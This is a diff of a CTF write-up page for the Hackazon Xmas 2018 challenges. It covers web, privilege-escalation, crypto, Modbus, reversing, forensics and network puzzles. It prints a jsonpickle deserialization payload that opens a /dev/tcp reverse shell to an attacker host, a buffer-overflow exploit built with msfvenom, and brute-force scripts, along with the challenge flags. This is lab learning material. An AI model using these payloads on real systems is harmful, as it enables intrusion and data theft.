@@ -7,11 +7,9 @@ title: Hackazon XMAS 2018
     <h1>Hackazon Xmas 2018</h1>
     <p class="date">08/01/2019</p>
 
-    <p>This is the write-up for the CTF Hackazon organized during the winter holidays (December 21 - January 6
-        2019).<br>
-        Most of the challenges are pretty easy but also really interesting, I learnt a lot with these.<br>
-        I finished in the third position completing all the challenges, here are my solutions for all of them,
-        hope it helps.</p>
+    <p>This is the write-up for the CTF Hackazon organized during the winter holidays (December 21 - January 6 2019).<br>
+    Most of the challenges are pretty easy but also really interesting, I learnt a lot with these.<br>
+    I finished in the third position, completing all the challenges, here are my solutions for all of them, hope it helps.</p>
 
     <div class="flexcontainer">
         <a class="link-box" href="#xmas_adventure">X-MAS Adventure [NETWORK][EXPLOIT]</a>
@@ -31,14 +29,10 @@ title: Hackazon XMAS 2018
         <h2>X-MAS Adventure [NETWORK][EXPLOIT]</h2>
         <h3>[50] Discover the "Adventure" site</h3>
 
-        <p class="challenge-description">Can you find the vulnerable site on 10.6.0.2? The site contains the first
-            flag. Flag
-            format: CTF{32-hex}</p>
+        <p class="challenge-description">Can you find the vulnerable site on 10.6.0.2? The site contains the first flag. Flag format: CTF{32-hex}</p>
 
         <p>In this challenge only the IP <code>10.6.0.2</code> is provided.<br>
-            As specified on the description it's necessary to access the website, unfortunately the default port 80
-            seems to be
-            blocked, so let's try to use https on port 443 instead.</p>
+            As specified in the description, it's necessary to access the website, unfortunately the default port 80 seems to be blocked, so let's try to use https on port 443 instead.</p>
 
         <img class="img-fluid" src="/static/img/hackazon-xmas-2018/xmas_adventure/1.PNG">
 
@@ -46,55 +40,39 @@ title: Hackazon XMAS 2018
 
         <img class="img-fluid" src="/static/img/hackazon-xmas-2018/xmas_adventure/2.PNG">
 
-        <p>Now we know the site's name <code>adventure.hz</code>, edit <code>/etc/hosts</code> to add the following
-            line.</p>
+        <p>Now we know the site's name <code>adventure.hz</code>, edit <code>/etc/hosts</code> to add the following line.</p>
 
         <pre class="prettyprint">10.6.0.2        adventure.hz</pre>
 
-        <p>After having the name and the IP relation, it's possible to access to <code>https://adventure.hz</code>
-            and have the
-            following page rendered.</p>
+        <p>After having the name and the IP relation, it's possible to access to <code>https://adventure.hz</code> and have the following page rendered.</p>
 
         <img class="img-fluid" src="/static/img/hackazon-xmas-2018/xmas_adventure/3.PNG">
 
         <p>The flag is hidden in the source code of the page.</p>
 
-        <pre class="prettyprint">
-CTF{8C1E0867D96D6A08E1DD7CD6A323CDC7}
-</pre>
+        <pre class="prettyprint">CTF{8C1E0867D96D6A08E1DD7CD6A323CDC7}</pre>
 
         <h3>[100] Compromise the server</h3>
 
-        <p class="challenge-description">Can you find a way to gain access on the server and read the /flag.txt
-            file? Flag
-            format: CTF{32-hex}</p>
+        <p class="challenge-description">Can you find a way to gain access on the server and read the /flag.txt file? Flag format: CTF{32-hex}</p>
 
         <p>Looking at the GET Response you can see that the following cookie is being set.</p>
 
-        <pre class="prettyprint">
-Set-Cookie: session=eyJweS9vYmplY3QiOiAidXdzZ2lfZmlsZV9fd2ViYXBwX2NoYWxsLnNlc3Npb24iLCAic2Vzc192YWwiOiAiR3Vlc3QifQ==; Path=/
-</pre>
+        <pre class="prettyprint">Set-Cookie: session=eyJweS9vYmplY3QiOiAidXdzZ2lfZmlsZV9fd2ViYXBwX2NoYWxsLnNlc3Npb24iLCAic2Vzc192YWwiOiAiR3Vlc3QifQ==; Path=/</pre>
 
         <p>Decode the base64 value and get this code.</p>
 
-        <pre class="prettyprint">
-root@kali:~/hackazon/xmas_adventure# echo eyJweS9vYmplY3QiOiAidXdzZ2lfZmlsZV9fd2ViYXBwX2NoYWxsLnNlc3Npb24iLCAic2Vzc192YWwiOiAiR3Vlc3QifQ== | base64 -d
-{"py/object": "uwsgi_file__webapp_chall.session", "sess_val": "Guest"}
-</pre>
+        <pre class="prettyprint">root@kali:~/hackazon/xmas_adventure# echo eyJweS9vYmplY3QiOiAidXdzZ2lfZmlsZV9fd2ViYXBwX2NoYWxsLnNlc3Npb24iLCAic2Vzc192YWwiOiAiR3Vlc3QifQ== | base64 -d
+{"py/object": "uwsgi_file__webapp_chall.session", "sess_val": "Guest"}</pre>
 
         <p>Using Burp I changed the value of the cookie to some random characters and received this response.</p>
 
         <img class="img-fluid" src="/static/img/hackazon-xmas-2018/xmas_adventure/4.PNG">
 
-        <p>The <code>jsonpickle</code> python library has a vulnerability on the <code>loads()</code> function which
-            allows an
-            attacker to execute commands on the server to retrieve a reverse shell.<br>
-            I used <a href="https://github.com/VerSprite/flask-json-pickle/blob/master/json_pickle_sploit.py
-">this script</a> to make a proper payload, specifying the following commands to be executed.</p>
+        <p>The <code>jsonpickle</code> python library has a vulnerability on the <code>loads()</code> function which allows an attacker to execute commands on the server to retrieve a reverse shell.<br>
+        I used <a href="https://github.com/VerSprite/flask-json-pickle/blob/master/json_pickle_sploit.py">this script</a> to make a proper payload, specifying the following commands to be executed.</p>
 
-        <pre class="prettyprint">
-return (subprocess.Popen, (('/bin/bash','-c', "/bin/bash -i &> /dev/tcp/10.6.0.10/4444 0>&1"),))
-</pre>
+        <pre class="prettyprint">return (subprocess.Popen, (('/bin/bash','-c', "/bin/bash -i &> /dev/tcp/10.6.0.10/4444 0>&1"),))</pre>
 
         <pre class="prettyprint">
 root@kali:~/hackazon/xmas_adventure# python sploit.py
@@ -103,9 +81,7 @@ root@kali:~/hackazon/xmas_adventure# python sploit.py
 [*] JSON encoded Pickle: {"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["/bin/bash", "-c", "/bin/bash -i &> /dev/tcp/10.6.0.10/4444 0>&1"]}]}, null, null, null]}
 </pre>
 
-        <p>Use the obtained base64 encoded payload as the cookie value, listen on the specified port, get a reverse
-            shell as
-            <code>www-data</code> and read the flag.</p>
+        <p>Use the obtained base64 encoded payload as the cookie value, listen on the specified port, get a reverse shell as <code>www-data</code> and read the flag.</p>
 
         <pre class="prettyprint">
 root@kali:~/hackazon/xmas_adventure# nc -nlvp 4444
@@ -121,12 +97,9 @@ CTF{F41804EFDE924D72491206F4E5372F80}
 
         <h3>[150] Privilege escalation</h3>
 
-        <p class="challenge-description">Can you escalate your privileges to root user and read the /root/flag.txt
-            file? Flag
-            format: CTF{32-hex}</p>
+        <p class="challenge-description">Can you escalate your privileges to root user and read the /root/flag.txt file? Flag format: CTF{32-hex}</p>
 
-        <p>Looking around in the machine I found some interesting files <code>notes_for_santa.txt</code> and
-            <code>send_to_santa</code> owned by root, the last one being writeable by <code>www-data</code>.</p>
+        <p>Looking around in the machine I found some interesting files <code>notes_for_santa.txt</code> and <code>send_to_santa</code> owned by root, the last one being writeable by <code>www-data</code>.</p>
 
         <pre class="prettyprint">
 www-data@712b6f9ecaf5:/$ ls -la
@@ -163,13 +136,8 @@ drwxr-xr-x   1 root     root       96 Dec  7 12:39 var
 drwxr-xr-x   1 www-data www-data   64 Dec 14 09:27 webapp
 </pre>
 
-        <p>I downloaded both to my machine to observe the behaviour. After some testing I found that when the binary
-            was
-            executed it read the txt file and created a <code>backup.txt</code> file under root's home
-            directory.<br>
-            The good part comes that when the txt file was too large a <code>Segmentation Fault</code> error
-            appeared revealing
-            a possible buffer overflow vulnerability.</p>
+        <p>I downloaded both to my machine to observe the behaviour. After some testing I found that when the binary was executed it read the txt file and created a <code>backup.txt</code> file under root's home directory.<br>
+        The good part comes that when the txt file was too large a <code>Segmentation Fault</code> error appeared revealing a possible buffer overflow vulnerability.</p>
 
         <p>Use <code>ROPgadget</code> to find a <code>jmp</code> instruction where to jump.</p>
 
@@ -190,9 +158,7 @@ Unique gadgets found: 1
 root@kali:~/hackazon/xmas_adventure# msfvenom -p linux/x86/read_file PATH=/root/flag.txt -f python -b "\x00"
 </pre>
 
-        <p>I created the following python script to generate the malicious txt, using the obtained return
-            instruction and the
-            payload.</p>
+        <p>I created the following python script to generate the malicious txt, using the obtained return instruction and the payload.</p>
 
         <pre class="prettyprint">
 buf =  ""
@@ -214,8 +180,7 @@ with open('notes_for_santa.txt', 'w') as f:
 f.write(payload)
 </pre>
 
-        <p>Replace the malicious <code>notes_for_santa.txt</code> and run the binary to be able to read the flag.
-        </p>
+        <p>Replace the malicious <code>notes_for_santa.txt</code> and run the binary to be able to read the flag.</p>
 
         <pre class="prettyprint">
 www-data@712b6f9ecaf5:/$ ./send_to_santa
@@ -228,19 +193,9 @@ CTF{D78A7F5290C85DBFA41F590A37484373}
         <h2>EFC [CRYPTO]</h2>
         <h3>[150] HELP US SAVE CHRISTMAS!</h3>
 
-        <p class="challenge-description">The easter bunny group known as bs0ciety hacked into one of North Pole's
-            datacenters
-            and encrypted all the files they could get access to. One of the files they encrypted was the list of
-            naughty and
-            good children for the year! We can't have Christmas this way :(. Luckily, one of our elves managed to
-            find the
-            encrypted list and a piece of software that the bunnies left behind. Can you help us recover the list
-            and save
-            Christmas?</p>
+        <p class="challenge-description">The easter bunny group known as bs0ciety hacked into one of North Pole's datacenters and encrypted all the files they could get access to. One of the files they encrypted was the list of naughty and good children for the year! We can't have Christmas this way :(. Luckily, one of our elves managed to find the encrypted list and a piece of software that the bunnies left behind. Can you help us recover the list and save Christmas?</p>
 
-        <p>In this challenge an encoded file <code>5c1172484633f632253808.ef</code> and the script which was used to
-            encode it
-            <code>efc.py</code> are provided.</p>
+        <p>In this challenge an encoded file <code>5c1172484633f632253808.ef</code> and the script which was used to encode it <code>efc.py</code> are provided.</p>
 
         <pre class="prettyprint">
 %EF-1.3.37}Äe7G<=°ÉŒšäõ)»g-#ØQ{šo˜K“T3AO31fmJlNufNPi7jaUXnr9YQcqMEypvVFPqkFENnA1LpDci8zejVfcH/2HzAmx
@@ -353,14 +308,9 @@ if __name__ == '__main__':
 main()
 </pre>
 
-        <p>Looking at what the code is doing it's possible to see that the firsts bytes of the encoded file are the
-            SHA256 hash
-            of the key used to encrypt the file. The rest, is the content of the xored file with that key and then
-            encoded in
-            base64.</p>
+        <p>Looking at what the code is doing it's possible to see that the firsts bytes of the encoded file are the SHA256 hash of the key used to encrypt the file. The rest, is the content of the xored file with that key and then encoded in base64.</p>
 
-        <p>First of all, we have to remove the SHA256 hash from the encrypted file and remove newlines to be able to
-            decode the base64.</p>
+        <p>First of all, we have to remove the SHA256 hash from the encrypted file and remove newlines to be able to decode the base64.</p>
 
         <pre class="prettyprint">
 root@kali:~/hackazon/efc# cut -c-100 b64
@@ -373,10 +323,9 @@ T3AO31fmJlNufNPi7jaUXnr9YQcqMEypvVFPqkFENnA1LpDci8zejVfcH/2HzAmx425AaUEfPvCD8NWp
 root@kali:~/hackazon/efc# base64 -d b64 > bin
 </pre>
 
-        <p>The main vulnerability of using XOR to encrypt files is that it's possible to obtain the key used on the
-            XOR operation because there are always characters which are repeated more often.<br>
-            The lenght of the key is already known based on the provided code <code>2056/8 = 257</code>.<br>
-            Use <code>xortool</code> to bruteforce all the possible combinations:</p>
+        <p>The main vulnerability of using XOR to encrypt files is that it's possible to obtain the key used on the XOR operation because there are always characters which are repeated more often.<br>
+        The lenght of the key is already known based on the provided code <code>2056/8 = 257</code>.<br>
+        Use <code>xortool</code> to bruteforce all the possible combinations:</p>
 
         <pre class="prettyprint">
 root@kali:~/hackazon/efc# xortool -l 257 -b bin
@@ -422,14 +371,11 @@ output: GIF image data, version 89a, 360 x 191
         <h2>Modbus [MISC]</h2>
         <h3>[10] Product code && [10] Revision</h3>
 
-        <p class="challenge-description">We intercepted Modbus traffic between the HMI and PLC's. The HMI queried
-            for the
-            product code, can you find it? Use the modbus_capture.pcap file.</p>
+        <p class="challenge-description">We intercepted Modbus traffic between the HMI and PLC's. The HMI queried for the product code, can you find it? Use the modbus_capture.pcap file.</p>
 
         <p class="challenge-description">Can you also find the revision code?</p>
 
-        <p>A pcap file is provided with the traffic intercepted between dthe HMI and PLC's. Inpect it with
-            <code>wireshark</code>.</p>
+        <p>A pcap file is provided with the traffic intercepted between the HMI and PLC's. Inpect it with <code>wireshark</code>.</p>
 
         <pre class="prettyprint">root@kali:~/hackazon/modbus# wireshark modbus_capture.pcap</pre>
 
@@ -441,8 +387,7 @@ output: GIF image data, version 89a, 360 x 191
 
         <h3>[25] Holding registers</h3>
 
-        <p class="challenge-description">The HMI also queried specific register values stored in the PLC. Use the
-            modbus_capture.pcap.</p>
+        <p class="challenge-description">The HMI also queried specific register values stored in the PLC. Use the modbus_capture.pcap.</p>
 
         <p>In one of the lasts packets of the pcap, the value of the holding register is shown.</p>
 
@@ -450,30 +395,24 @@ output: GIF image data, version 89a, 360 x 191
 
         <h3>[25] Input registers</h3>
 
-        <p class="challenge-description">The HMI also queried specific register values stored in the PLC. Use the
-            modbus_capture.pcap.</p>
+        <p class="challenge-description">The HMI also queried specific register values stored in the PLC. Use the modbus_capture.pcap.</p>
 
         <p>In every response packet, the PLC is responding with a letter.</p>
 
         <img class="img-fluid" src="/static/img/hackazon-xmas-2018/modbus/4.PNG">
 
-        <p>When combining all the letters received, a base64 message appears <code>Q1RGezMyYTc5YTY2NzcyNDZhYjc0ODM4OTY1YmYxYmVjOTQ1fQ==</code>.
-            Decode it to obtain the flag.</p>
+        <p>When combining all the letters received, a base64 message appears <code>Q1RGezMyYTc5YTY2NzcyNDZhYjc0ODM4OTY1YmYxYmVjOTQ1fQ==</code>. decode it to obtain the flag.</p>
 
         <pre class="prettyprint">root@kali:~/hackazon/modbus# echo Q1RGezMyYTc5YTY2NzcyNDZhYjc0ODM4OTY1YmYxYmVjOTQ1fQ== | base64 -d
 CTF{32a79a6677246ab74838965bf1bec945}</pre>
 
         <h3>[25] Product code && [25] Revision</h3>
 
-        <p class="challenge-description">Launch the challenge and connect to the VPN. Now use the knowledge gained
-            from the PCAP
-            to connect to the PLC. You can use synchronous_client_snippet.py as a starting point.</p>
+        <p class="challenge-description">Launch the challenge and connect to the VPN. Now use the knowledge gained from the PCAP to connect to the PLC. You can use synchronous_client_snippet.py as a starting point.</p>
 
         <p class="challenge-description">Can you also find the revision code?</p>
 
-        <p>Using the following python script it's possible to query the required information to the PLC to obtain
-            the product
-            and revision codes. Use the <code>unit=1</code> as shown in the provided pcap.</p>
+        <p>Using the following python script it's possible to query the required information to the PLC to obtain the product and revision codes. Use the <code>unit=1</code> as shown in the provided pcap.</p>
 
         <pre class="prettyprint">
 #!/usr/bin/env python
@@ -494,9 +433,7 @@ print r.information
 
         <h3>[30] Holding registers</h3>
 
-        <p class="challenge-description">The HMI also queried specific register values stored in the PLC. Can you
-            connect to the
-            VPN and do the same?</p>
+        <p class="challenge-description">The HMI also queried specific register values stored in the PLC. Can you connect to the VPN and do the same?</p>
 
         <p>As specified on the pcap, the unit to be queried is the number <code>35</code>.</p>
 
@@ -517,9 +454,7 @@ CTF{1040c2523b32e29b88ff1bb5b798e53b}
 
         <h3>[50] Input registers</h3>
 
-        <p class="challenge-description">The HMI also queried specific register values stored in the PLC. Can you
-            connect to the
-            VPN and do the same?</p>
+        <p class="challenge-description">The HMI also queried specific register values stored in the PLC. Can you connect to the VPN and do the same?</p>
 
         <p>Use the following function to retrieve the values for the input regiters.</p>
 
@@ -581,19 +516,13 @@ CTF{Santa_baby_so_hurry_down_the_chimney_tonight}
         <h2>Combination Lock [REVERSING]</h2>
         <h3>[300] Combination Lock</h3>
 
-        <p class="challenge-description">We have created a custom hashing algorithm to protect our passwords when
-            stored in
-            JavaScript. Can you reverse the algorithm?
-            You will need to use a browser which supports WebAssembly.</p>
+        <p class="challenge-description">We have created a custom hashing algorithm to protect our passwords when stored in JavaScript. Can you reverse the algorithm? You will need to use a browser which supports WebAssembly.</p>
 
-        <p>On this challenge a <code>Combination Lock.html</code> file is given, open it with any web browser to see
-            a webpage
-            where a pincode is requested.</p>
+        <p>On this challenge a <code>Combination Lock.html</code> file is given, open it with any web browser to see a webpage where a pincode is requested.</p>
 
         <img class="img-fluid" src="/static/img/hackazon-xmas-2018/combination/1.PNG">
 
-        <p>Looking at the source code it's possible to see the function which is called when clicking the unlock
-            button.</p>
+        <p>Looking at the source code it's possible to see the function which is called when clicking the unlock button.</p>
 
         <pre class="prettyprint">
 var checkCombination = function checkCombination() {
@@ -606,8 +535,7 @@ return m.exports.YwAQZc(pinCode[0],pinCode[1],pinCode[2],pinCode[3],pinCode[4],p
 };
 </pre>
 
-        <p>The function to check if the provided code is correct is written in web assembly. Here's the first part
-            of it.</p>
+        <p>The function to check if the provided code is correct is written in web assembly. Here's the first part of it.</p>
 
         <pre class="prettyprint">
 func (param i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32) (result i32)
@@ -648,15 +576,9 @@ get_local 2
 ...
 </pre>
 
-        <p>The code is retrieving every character on the pin code, one by one, doing some calculations to it and
-            comparing to a
-            const value.<br>
-            To get the flag I put a breakpoint after every <code>br_if 0</code> instruction, here is where the
-            modified pincode
-            char is compared to the const value.<br>
-            I used the following javascript code to try every possible character and check if the breakpoint was
-            reached, then
-            the character was the correct and part of the flag.</p>
+        <p>The code is retrieving every character on the pin code, one by one, doing some calculations to it and comparing to a const value.<br>
+        To get the flag I put a breakpoint after every <code>br_if 0</code> instruction, here is where the modified pincode char is compared to the const value.<br>
+        I used the following javascript code to try every possible character and check if the breakpoint was reached, then the character was the correct and part of the flag.</p>
 
         <pre class="prettyprint">
 var flag = '';
@@ -675,11 +597,7 @@ m.exports.YwAQZc(pinCode[0],pinCode[1],pinCode[2],pinCode[3],pinCode[4],pinCode[
         <h2>Secretive Santa [MISC]</h2>
         <h3>[50] Book Of Children</h3>
 
-        <p class="challenge-description">Last year Santa moved his book of Children to a digital copy on a USB
-            drive. However,
-            some of his helper elves accidentally deleted some files of his digital book. Can you help save this
-            years
-            Christmas?</p>
+        <p class="challenge-description">Last year Santa moved his book of Children to a digital copy on a USB drive. However, some of his helper elves accidentally deleted some files of his digital book. Can you help save this years Christmas?</p>
 
         <p>In this challenge a <code>BookOfChildren.img</code> file is given.</p>
 
@@ -698,15 +616,13 @@ foundat=Evidence/Riley.jpgUT
 *****|
 </pre>
 
-        In one of the pictures extracted there's the flag.
+        <p>In one of the pictures extracted there's the flag.</p>
 
         <img class="img-fluid" src="/static/img/hackazon-xmas-2018/secretive_santa/Sasha.png">
 
         <h3>[125] Santas Evidence</h3>
 
-        <p class="challenge-description">Santa stored some evidence on naughty kids on the drive somewhere too.
-            Without the
-            evidence his quality assurance elves will never sign off on the coal for them!</p>
+        <p class="challenge-description">Santa stored some evidence on naughty kids on the drive somewhere too. Without the evidence his quality assurance elves will never sign off on the coal for them!</p>
 
         <p>Mount the image to access to its content.</p>
 
@@ -751,19 +667,14 @@ CTF{OhDeerItsChristmas}
 
         <h3>[200] The Locked Presents</h3>
 
-        <p class="challenge-description">Santa put the presents in a secured magical box. The key for this box was
-            also hidden
-            somewhere, but it seems to have gotten lost. Can you find the key and open the magical box?</p>
+        <p class="challenge-description">Santa put the presents in a secured magical box. The key for this box was also hidden somewhere, but it seems to have gotten lost. Can you find the key and open the magical box?</p>
 
-        <p>The magical box which is described above is the <code>presents</code> file which is an encryptred LUKS
-            file and a
-            master key is needed to decrypt it.</p>
+        <p>The magical box which is described above is the <code>presents</code> file which is an encryptred LUKS file and a master key is needed to decrypt it.</p>
 
         <pre class="prettyprint">root@kali:/mnt/bookofchildren# file presents
 presents: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: 93db1a26-3c03-43d6-bfd1-795de52a5d76</pre>
 
-        <p>Listing the directories in the image there's a hidden folder <code>...</code> which has a <code>password.txt</code>
-            file with a password.</p>
+        <p>Listing the directories in the image there's a hidden folder <code>...</code> which has a <code>password.txt</code> file with a password.</p>
 
         <pre class="prettyprint">
 root@kali:/mnt/bookofchildren# cat .../password.txt
@@ -786,12 +697,8 @@ Enter passphrase for presents: FelizNavidad</pre>
         <h2>Santa's mining pool [CRYPTO]</h2>
         <h3>[100] SHA256</h3>
 
-        <p class="challenge-description">Santa is launching his own crypto currency and is looking for miners with a
-            lot of
-            hashing power. To apply you need to proof you have some decent hashing power...<br>
-            Please provide a hex encoded value, we will decode it and hash it with sha-256. If your value ends in at
-            least 22
-            zeroes we will give you the flag...</p>
+        <p class="challenge-description">Santa is launching his own crypto currency and is looking for miners with a lot of hashing power. To apply you need to proof you have some decent hashing power...<br>
+        Please provide a hex encoded value, we will decode it and hash it with sha-256. If your value ends in at least 22 zeroes we will give you the flag...</p>
 
         <p>On this challenge only a webpage with an input to introduce the specified value is provided.</p>
 
@@ -848,31 +755,19 @@ else:
 
         <p>The code used is normal and nothing looks exploitable.</p>
 
-        <p>At first I made a simple script that generated random values and calculated the SHA256 hash to look if it
-            ended with
-            22 zeros, but then I calculated the possibilities and saw that it was almost impossible to get it on the
-            the
-            interval of time the CTF was up.</p>
+        <p>At first I made a simple script that generated random values and calculated the SHA256 hash to look if it ended with 22 zeros, but then I calculated the possibilities and saw that it was almost impossible to get it on the interval of time the CTF was up.</p>
 
-        <p>After spending too much time looking for solutions (I didn't finish first because of this) I saw Bitcoin
-            was the way
-            to go.<br>
-            I already knew that Bitcoin hashes needed to start with some zeros, but didn't really know how it was
-            calculated, <a
-                    href="https://en.bitcoin.it/wiki/Block_hashing_algorithm">here</a> it's explained.<br>
-            The truth is that the hash calculated has to end in zeros, but then because of Endianess it's reversed
-            and the
-            zeros end in the front.</p>
+        <p>After spending too much time looking for solutions (I didn't finish first because of this) I saw Bitcoin was the way to go.<br>
+        I already knew that Bitcoin hashes needed to start with some zeros, but didn't really know how it was calculated, <a href="https://en.bitcoin.it/wiki/Block_hashing_algorithm">here</a> it's explained.<br>
+        The truth is that the hash calculated has to end in zeros, but then because of Endianess it's reversed and the zeros end in the front.</p>
 
-        <p>Knowing that, the only thing to do is search for bitcoin hash with more than 22 zeros, I used this
-            one.</p>
+        <p>Knowing that, the only thing to do is search for bitcoin hash with more than 22 zeros, I used this one.</p>
 
         <pre class="prettyprint">
 <a href="https://btc.com/0000000000000000000000bb5b432a764ad6c7acf677dcd99161abfdf68e698e">0000000000000000000000bb5b432a764ad6c7acf677dcd99161abfdf68e698e</a>
 </pre>
 
-        <p>I looked for the values used to generate that hash and used the following script to get the hex
-            value.</p>
+        <p>I looked for the values used to generate that hash and used the following script to get the hex value.</p>
 
         <pre class="prettyprint">
 import hashlib
@@ -920,17 +815,10 @@ Nice, have a flag: CTF{b19c37bc7c6fcb94f8c43b109272d38f}
         <h2>Tenjin [CRYPTO]</h2>
         <h3>[200] Tenjin Cryptography</h3>
 
-        <p class="challenge-description">My crew just hacked Tenjin Corp. We got access to their database with
-            encrypted
-            credentials. We think they use homebrew crypto to store their passwords. Can you help us reverse their
-            admin
-            password so we can deface their intranet with cat pictures?
-            The encrypted admin password is uq`HzD*ev/TBnf^<br><br>
-            You can access their password encryption tool on 10.6.0.2:8080.</p>
+        <p class="challenge-description">My crew just hacked Tenjin Corp. We got access to their database with encrypted credentials. We think they use homebrew crypto to store their passwords. Can you help us reverse their admin password so we can deface their intranet with cat pictures? The encrypted admin password is uq`HzD*ev/TBnf^<br><br>
+        You can access their password encryption tool on 10.6.0.2:8080.</p>
 
-        <p>When connecting to the specified service on <code>10.6.0.2:8080</code> it's possible to test the
-            encryption
-            mechanism.</p>
+        <p>When connecting to the specified service on <code>10.6.0.2:8080</code> it's possible to test the encryption mechanism.</p>
 
         <pre class="prettyprint">
 root@kali:~/hackazon/tenjin# nc 10.6.0.2 8080
@@ -943,15 +831,10 @@ The encrypted result: 8b^uoP[.n
         <p>After some tests the follwoing assumptions can be taken:</p>
         <ul>
             <li>The encrypted result has the same length as the password.</li>
-            <li>When increasing the ASCII number from a character, the ASCII number for one of the characters in the
-                encrypted
-                result is also increased, meaning the position of the characters is mixed.
-            </li>
+            <li>When increasing the ASCII number from a character, the ASCII number for one of the characters in the encrypted result is also increased, meaning the position of the characters is mixed.</li>
         </ul>
 
-        <p>To retrieve the encrypted password I made the following script which connects to the service ant tests
-            the specified
-            character till find the correct one.</p>
+        <p>To retrieve the encrypted password I made the following script which connects to the service ant tests the specified character till find the correct one.</p>
 
         <pre class="prettyprint">
 import socket,time
@@ -1005,11 +888,7 @@ CTF{GG+wp%1337}
         <h2>XMAS Protocol [NETWORK]</h2>
         <h3>[150] SLEIGH/RIDE stack</h3>
 
-        <p class="challenge-description">Santa has a secret protocol built on the SLEIGH/RIDE stack for exchanging
-            XMAS packages
-            information. Can you find out how to reach the web server and get access to the information? The web
-            server is at
-            RIDE 168165378 on SLEIGH 1234.</p>
+        <p class="challenge-description">Santa has a secret protocol built on the SLEIGH/RIDE stack for exchanging XMAS packages information. Can you find out how to reach the web server and get access to the information? The web server is at RIDE 168165378 on SLEIGH 1234.</p>
 
         <p>In this challenge only the following python code is given.</p>
 
@@ -1056,31 +935,17 @@ if __name__ == "__main__":
 main()
 </pre>
 
-        <p>After translating all the christmas names to its real values we can see that the program is rejecting all
-            TCP packets
-            except the ones with <code>FSRPAUEC</code> flags set, then transforming the packet to a <code>SYN</code>
-            packet.</p>
+        <p>After translating all the christmas names to its real values we can see that the program is rejecting all TCP packets except the ones with <code>FSRPAUEC</code> flags set, then transforming the packet to a <code>SYN</code> packet.</p>
 
-        <p>As the description specified the service is running in IP <code>168165378 = 10.6.0.2</code> and port
-            <code>1234</code>.
+        <p>As the description specified the service is running in IP <code>168165378 = 10.6.0.2</code> and port <code>1234</code>.
 
-        <p>To being able to create the connection, first of all it's necessary to run the following command
-            specifying that we
-            don't want to send <code>RESET</code> packets to the host, because if not it's automaticaly sent after
-            our <code>FSRPAUEC</code>
-            packet, closing the connection.</p>
+        <p>To being able to create the connection, first of all it's necessary to run the following command specifying that we don't want to send <code>RESET</code> packets to the host, because if not it's automaticaly sent after our <code>FSRPAUEC</code> packet, closing the connection.</p>
 
         <pre class="prettyprint">
 root@kali:~/hackazon/xmas_protocol# iptables -A OUTPUT -d 10.6.0.2 -p tcp --tcp-flags ALL RST -j DROP
 </pre>
 
-        <p>I used the following python code to generate the TCP packets. The fist part is sending the
-            <code>FSRPAUEC</code>
-            packet, which will be transformed into a <code>SYN</code> packet, the machine will continue the three
-            way handshake
-            and send a <code>SYN/ACK</code> packet. Then from our host we will send an <code>ACK</code> packet to
-            close the
-            three way handshake. After that we will send an HTTP GET request.</p>
+        <p>I used the following python code to generate the TCP packets. The fist part is sending the <code>FSRPAUEC</code> packet, which will be transformed into a <code>SYN</code> packet, the machine will continue the three way handshake and send a <code>SYN/ACK</code> packet. Then from our host we will send an <code>ACK</code> packet to close the three way handshake. After that we will send an HTTP GET request.</p>
 
         <pre class="prettyprint">
 import sys
@@ -1123,9 +988,7 @@ Line-based text data: text/html (11 lines)
 &lt;/html>\n
 </pre>
 
-        <p>As seen in the above response, a <code>xmas_presents.txt</code> file exists on the server. Make another
-            GET request
-            to view the content.</p>
+        <p>As seen in the above response, a <code>xmas_presents.txt</code> file exists on the server. Make another GET request to view the content.</p>
 
         <pre class="prettyprint">
 getStr = 'GET /xmas_presents.txt HTTP/1.0\r\nHost:10.6.0.2\r\nAccept-Encoding: gzip, deflate\r\n\r\n'
